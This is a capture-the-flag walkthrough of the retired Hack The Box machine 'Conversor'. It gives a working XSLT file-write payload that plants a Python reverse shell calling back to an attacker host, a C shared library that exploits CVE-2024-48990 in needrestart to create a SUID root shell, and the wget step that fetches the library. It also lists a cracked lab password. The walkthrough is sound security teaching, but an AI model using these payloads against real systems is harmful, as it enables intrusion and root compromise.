# Conversor: Hack The Box Writeup

**Machine:** Conversor  
**OS:** Linux  
**Difficulty:** Easy  
**Status:** Retired  
**Date Completed:** February 2026  

---

## Summary

Conversor is an easy Linux machine running a Flask web application that allows authenticated users to upload XML and XSLT files for server-side transformation. The `/about` page exposes a downloadable source code archive containing `app.py` and the full app structure: revealing the XSLT injection path and the write target. The XSLT processor runs on libxslt and supports the `exslt:document` extension, which allows writing arbitrary files to the filesystem. By writing a malicious Python file into the app's `scripts/` directory and triggering the XSLT transformation, remote code execution is achieved as `www-data`. Querying the live SQLite database on the target reveals an MD5-hashed password for the system user `fismathack`, which cracks trivially. SSH access is gained via credential reuse. Privilege escalation to root exploits CVE-2024-48990, a vulnerability in `needrestart` that allows an unprivileged user to hijack the `PYTHONPATH` environment variable, causing `needrestart`: running as root via `sudo`: to load a malicious shared library that creates a SUID root shell.

**Key techniques:** Source code disclosure · XSLT injection · Arbitrary file write · RCE via script execution · SQLite credential extraction · MD5 cracking · Credential reuse · CVE-2024-48990 (needrestart PYTHONPATH hijack) · SUID shell

---

## Reconnaissance

Full port scan:

```bash
sudo nmap -sV -sC -p- -T4 10.129.12.253
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache httpd 2.4.52
```

Two services: SSH and a web server. The HTTP service resolves to `conversor.htb`: add it to the hosts file:

```bash
sudo echo "10.129.12.253  conversor.htb" >> /etc/hosts
```

---

## Enumeration

### Web Application

Navigating to `http://conversor.htb` presents a login page. Registration is open: creating an account with any credentials grants access to the dashboard.

<img width="1313" height="711" alt="Screenshot 2026-03-24 115937" src="https://github.com/user-attachments/assets/faa0ca91-a18a-44c2-99a4-e14978a1c112" />

The application describes itself as a tool for converting Nmap XML output into a more readable HTML format. It accepts two uploaded files: an XML file and an XSLT stylesheet.

### Directory Enumeration

```bash
gobuster dir -u http://conversor.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

```
/about         (Status: 200)
/login         (Status: 200)
/logout        (Status: 302)
/register      (Status: 200)
/server-status (Status: 403)
```

Nothing hidden server-side. No vhosts discovered either. The `/about` page is worth visiting manually.

### Source Code Disclosure: `/about`

The `/about` page contains a direct download link to the full application source:

```
http://conversor.htb/static/source_code.tar.gz
```

Extracting it:

```bash
tar -xvf source_code.tar.gz
```

```
app.py
app.wsgi
install.md
instance/
instance/users.db
scripts/
static/
static/images/
static/nmap.xslt
static/style.css
templates/
uploads/
```

The archive includes `instance/users.db`, but it's empty: a template artifact from development, not the live database. The valuable finds here are `app.py` and the directory structure.

### Analysing `app.py`

The `/convert` route processes uploaded XSLT with `lxml.etree.XSLT`: no restrictions on the `exslt:document` extension, meaning arbitrary file writes to the server filesystem are possible.

Two other things stand out:

```python
DB_PATH = '/var/www/conversor.htb/instance/users.db'

# Passwords stored as unsalted MD5
password = hashlib.md5(request.form['password'].encode()).hexdigest()
```

The live database path is hardcoded, and passwords are hashed with unsalted MD5: trivially crackable if we can read the database. That becomes the post-shell objective.

The `scripts/` directory in the archive is empty and gets imported by the app. Writing a Python file there means it will be executed when the next XSLT transformation runs: that's the write target.

### XSLT Processor Fingerprinting

`app.py` imports from `lxml`, but it's good practice to confirm the exact processor before building a payload:

**test.xml:**
```xml
<?xml version="1.0"?>
<root></root>
```

**test.xslt:**
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    Version: <xsl:value-of select="system-property('xsl:version')"/>
    Vendor: <xsl:value-of select="system-property('xsl:vendor')"/>
    Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Result:**

```
Version: 1.0
Vendor: libxslt
Vendor URL: http://xmlsoft.org/XSLT/
```

Confirmed: **libxslt**. This processor cannot execute system commands directly, but supports `exslt:document` for arbitrary file writes: which is exactly what's needed here.

---

## Initial Access

### XSLT Injection: Arbitrary File Write to RCE

The `exslt:document` extension writes the contents of an XSLT template to an arbitrary path on the server. The target is `scripts/`: confirmed empty in the source archive, imported by the Flask app, so any `.py` file written there will be executed when the next XSLT transformation is processed.

**exploit.xslt:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exslt="http://exslt.org/common"
    extension-element-prefixes="exslt"
    version="1.0">
  <xsl:template match="/">
    <exslt:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.12\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'")
    </exslt:document>
  </xsl:template>
</xsl:stylesheet>
```

Set up a listener:

```bash
nc -lvnp 9001
```

Upload `exploit.xslt` alongside the minimal XML file. The XSLT transformation writes `shell.py` into `scripts/` and executes it immediately as part of processing: the listener catches the connection:

```
connect to [10.10.15.12] from (UNKNOWN) [10.129.12.253]
www-data@conversor:~/conversor.htb$
```

Stabilise the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Credential Harvesting: Live SQLite Database

With a shell as `www-data`, query the live database at the path revealed in `app.py`:

```bash
sqlite3 /var/www/conversor.htb/instance/users.db "SELECT * FROM users;"
```

```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
```

Submitting the hash to CrackStation returns the plaintext immediately: `Keepmesafeandwarm`.

### SSH Access: Credential Reuse

```bash
ssh fismathack@10.129.12.253
# Password: Keepmesafeandwarm
```

```bash
cat user.txt
# eb02b06f8002daa658e2cc61092aa664
```

---

## Privilege Escalation: CVE-2024-48990 (needrestart PYTHONPATH Hijack)

### Enumeration

```bash
sudo -l
```

```
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

`fismathack` can run `needrestart` as root with no password. Checking the version:

```bash
needrestart --version
# needrestart 3.7
```

Version 3.7 is vulnerable to **CVE-2024-48990**. `needrestart` scans running processes for outdated libraries: when it finds a Python interpreter, it re-invokes Python to inspect it. It does this without sanitising the environment, meaning a `PYTHONPATH` variable set in the calling environment is inherited by the root-owned Python process. This allows an attacker to place a malicious module in a controlled directory and have it loaded and executed as root.

### Building the Malicious Shared Library

The hijack targets Python's `importlib` module. A pure Python `__init__.py` won't work cleanly because Python imports `importlib` internally during its own startup: it would fire for any Python process, not just the root one. Instead, a compiled shared library with a constructor function is used: `__attribute__((constructor))` causes it to execute on load, and a `geteuid() == 0` check ensures the payload only runs when loaded by a root process.

**lib.c** (compiled on attack machine):

```c
#include <stdlib.h>
#include <unistd.h>

static void pwn() __attribute__((constructor));

void pwn() {
    if (geteuid() == 0) {
        setuid(0);
        setgid(0);
        system("cp /bin/sh /tmp/poc; chmod u+s /tmp/poc");
    }
}
```

```bash
gcc -shared -fPIC -o __init__.so lib.c
python3 -m http.server 8000
```

Transfer to target:

```bash
mkdir -p /tmp/malicious/importlib
wget http://10.10.15.12:8000/__init__.so -O /tmp/malicious/importlib/__init__.so
```

### Exploitation

The exploit requires two sessions running simultaneously.

**Session 1: polling loop:**

```bash
cat << 'EOF' > /tmp/malicious/e.py
import time, os
print("Waiting...")
while True:
    if os.path.exists("/tmp/poc"):
        print("Got it!")
        os.system("/tmp/poc -p")
        break
    time.sleep(1)
EOF
cd /tmp/malicious && PYTHONPATH=/tmp/malicious python3 e.py
```

**Session 2: trigger needrestart as root:**

```bash
PYTHONPATH=/tmp/malicious sudo needrestart
```

`needrestart` runs as root, invokes Python with the inherited `PYTHONPATH`, Python loads `/tmp/malicious/importlib/__init__.so`, the constructor fires, `geteuid()` returns 0, and `/tmp/poc` is created as a SUID root shell. The polling loop catches it:

```
Got it!
# whoami
root
# cat /root/root.txt
2c3000756c7448b45e46aa817ad91b42
```

### Cleanup

```bash
rm /tmp/poc
rm -rf /tmp/malicious
```

---

<!-- Completion Image Here -->
<img width="1191" height="680" alt="Screenshot 2026-04-23 120714" src="https://github.com/user-attachments/assets/94264356-414e-4fae-8828-6b64938c41b5" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| Source code disclosure | `/about` → `source_code.tar.gz` | Full app source and directory structure exposed |
| XSLT injection (`exslt:document`) | XML/XSLT upload endpoint | Arbitrary file write to server filesystem |
| Script execution on XSLT processing | Flask app `scripts/` directory | RCE as `www-data` |
| Unsalted MD5 password hashing | Live `instance/users.db` | Credentials cracked instantly post-shell |
| Credential reuse | DB → SSH | SSH access as `fismathack` |
| CVE-2024-48990 (needrestart) | `/usr/sbin/needrestart` | `PYTHONPATH` hijack → root via SUID shell |

---

## Key Takeaways

- **Read everything before touching anything**: the `/about` page handed over the entire attack surface in a single download: full source code, directory layout, and the confirmed write target, all before sending a single exploit payload
- **Don't assume bundled files are live**: `instance/users.db` in the tarball was empty; the credentials lived in the live database on the server. Verify rather than assume
- **Fingerprint before attacking**: knowing the XSLT processor is libxslt immediately ruled out command execution and pointed to file write as the viable path. Processor-specific capabilities determine the entire attack surface
- **An empty directory is still an attack surface**: `scripts/` being empty and writable was the foothold; the write target was confirmed from the source archive, not guessed
- **MD5 is not a password hash**: unsalted MD5 is broken instantly by any online cracking database; use bcrypt, argon2, or scrypt
- **Sudo privileges on system tools are dangerous**: `needrestart` looks innocuous but running it as root with an inherited environment is enough for full compromise
- **Environment variable inheritance is an attack surface**: CVE-2024-48990 exists entirely because `needrestart` failed to sanitise `PYTHONPATH` before invoking Python as root; always strip or whitelist environment variables before privilege escalation
- **Constructors fire on library load**: `__attribute__((constructor))` in C is a clean technique for payloads that need to execute the moment a library is imported, without relying on explicit function calls

---

*Part of my HTB writeup series: [back to portfolio](https://github.com/Egio7)*
